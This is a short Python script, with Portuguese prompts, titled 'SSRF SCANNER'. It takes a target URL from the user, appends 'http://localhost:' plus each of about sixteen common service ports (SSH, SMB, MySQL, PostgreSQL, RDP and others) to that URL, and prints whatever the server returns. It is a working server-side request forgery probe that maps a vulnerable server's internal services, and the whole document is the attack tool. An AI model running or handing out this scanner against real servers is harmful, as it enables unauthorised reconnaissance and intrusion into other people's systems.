import requests
print("SSRF SCANNER")
URL = input("Digite seu alvo: ")
portas = {21,22,23,25,139,445,443,80,8000,3306,5432,8080,8888,8443,3389,121}
for port in portas:
    print("Testando a  porta ["+str(port)+"]:")
    r = requests.get(URL+"http://localhost:"+str(port))
    print(r.text)
